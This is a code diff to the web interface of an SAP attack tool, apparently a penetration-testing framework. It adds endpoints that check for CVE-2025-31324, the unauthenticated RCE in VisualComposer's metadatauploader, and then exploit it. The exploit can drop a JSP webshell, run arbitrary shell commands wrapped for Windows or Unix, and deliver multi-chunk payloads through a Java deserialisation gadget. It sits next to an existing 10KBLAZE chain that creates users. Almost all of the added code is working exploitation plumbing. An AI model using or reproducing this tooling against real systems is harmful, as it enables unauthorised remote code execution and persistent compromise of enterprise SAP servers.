@@ -1203,6 +1203,77 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_ms", "Check MS Betrusted", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/check_cve_2025_31324", method="POST")
+    def node_check_cve_2025_31324(sid):
+        """Probe Java ports for CVE-2025-31324 (metadatauploader unauth RCE).
+
+        Only meaningful for Java / double-stack systems — returns an error
+        for pure ABAP nodes rather than silently succeeding.
+        """
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        sys_type = (node.system_type or "").upper()
+        if "JAVA" not in sys_type:
+            return json.dumps({"error": "Not a Java / double-stack system — "
+                                         "CVE-2025-31324 does not apply"})
+
+        def _run():
+            print(f"[*] {sid}: Checking CVE-2025-31324 "
+                  f"(VisualComposer metadatauploader)...")
+            found = sapmap_scanner.check_cve_2025_31324(node)
+            if found:
+                print(f"[+] {sid}: VULNERABLE — port "
+                      f"{node.cve_2025_31324_port} · {node.cve_2025_31324_evidence}")
+            elif node.cve_2025_31324_evidence:
+                print(f"[*] {sid}: not vulnerable ({node.cve_2025_31324_evidence})")
+            else:
+                print(f"[*] {sid}: no Java HTTP port responded")
+
+        _bg(f"{sid}:check_cve_31324", "Check CVE-2025-31324", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/exploit_cve_2025_31324", method="POST")
+    def node_exploit_cve_2025_31324(sid):
+        """Exploit CVE-2025-31324.  mode: "command" (default) | "dropshell".
+        For "command" supply a "command" field (string).  Responds
+        synchronously with the execution result."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        if not node.cve_2025_31324_vulnerable:
+            return json.dumps({"error": "CVE-2025-31324 not confirmed on "
+                                         "this node — run Check first"})
+
+        mode = data.get("mode", "command")
+        if mode == "dropshell":
+            result = sapmap_exploit.drop_cve_2025_31324_shell(node)
+            if result.get("success"):
+                print(f"[+] {sid}: JSP webshell dropped at {result['shell_url']}")
+            else:
+                print(f"[-] {sid}: dropshell failed: "
+                      f"{result.get('error', '?')}")
+            return json.dumps(result)
+
+        # mode == "command"
+        cmd = (data.get("command") or "").strip()
+        if not cmd:
+            return json.dumps({"error": "command is required"})
+        # Auto-wrap in shell based on node OS (same pattern as exec_command)
+        os_type = (node.os_type or "").lower()
+        is_win = any(w in os_type for w in ("windows", "nt", "win"))
+        # If OS unknown, assume Windows (SJJ-style SAP Java is commonly Windows);
+        # user can override via Set OS Type.
+        if not os_type or is_win:
+            wrapped = f"cmd.exe /C {cmd}"
+        else:
+            wrapped = f"/bin/sh -c {cmd!r}"
+        result = sapmap_exploit.execute_cve_2025_31324_via_shell(node, wrapped)
+        return json.dumps(result)
+
     @app.route("/api/node/<sid>/betrusted_chain", method="POST")
     def node_betrusted_chain(sid):
         """Full 10KBLAZE chain: betrusted → check GW trust → SAPXPG → create user."""
@@ -1776,7 +1847,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
         if not node:
             return json.dumps({"error": f"Node {sid} not found"})
 
-        method = data.get("method", "gateway")  # "gateway" or "sxpg"
+        method = data.get("method", "gateway")  # "gateway" | "sxpg" | "cve_31324"
         cmdline = data.get("cmdline", "").strip()
         command = data.get("command", "").strip()
         params = data.get("params", "").strip()
@@ -1850,6 +1921,14 @@ def create_app(api: SAPMAPApi) -> Bottle:
             if not creds:
                 return json.dumps({"error": "No credentials available"})
             result = sapmap_rfc.execute_local_command(node, command, params, creds)
+        elif method == "cve_31324":
+            if not node.cve_2025_31324_vulnerable:
+                return json.dumps({"error": "CVE-2025-31324 not confirmed — "
+                                             "run Check first"})
+            # Route through the dropped shell when available (captures stdout),
+            # otherwise fall back to the blind Runtime.exec gadget.
+            full = (command + (" " + params if params else "")).strip()
+            result = sapmap_exploit.execute_cve_2025_31324_via_shell(node, full)
         else:
             return json.dumps({"error": f"Unknown method: {method}"})
 
@@ -1944,6 +2023,25 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 result = sapmap_exploit.execute_gw_command(
                     node, payload["command"], payload["params"],
                     long_params=payload.get("long_params"))
+            elif method == "cve_31324":
+                # CVE-2025-31324: Java deserialisation gadget runs
+                # Runtime.exec(<cmd>).  Runtime.exec tokenises on spaces, so we
+                # rejoin (command, params) and let the dropped shell (if any)
+                # capture stdout for progress feedback.
+                pre_steps = payload.get("steps", [])
+                if pre_steps:
+                    total = len(pre_steps)
+                    for idx, step in enumerate(pre_steps):
+                        if _session_ref.cancelled:
+                            print(f"[*] {sid}: Payload delivery cancelled")
+                            return
+                        _set_progress(
+                            f"Writing payload chunk {idx+1}/{total}...")
+                        sapmap_exploit.execute_cve_2025_31324_command(
+                            node, step["command"], step["params"])
+                _set_progress("Executing payload...")
+                result = sapmap_exploit.execute_cve_2025_31324_command(
+                    node, payload["command"], payload["params"])
             else:
                 # SXPG: split EXTPROG + PARAMS
                 creds = node.best_credentials()
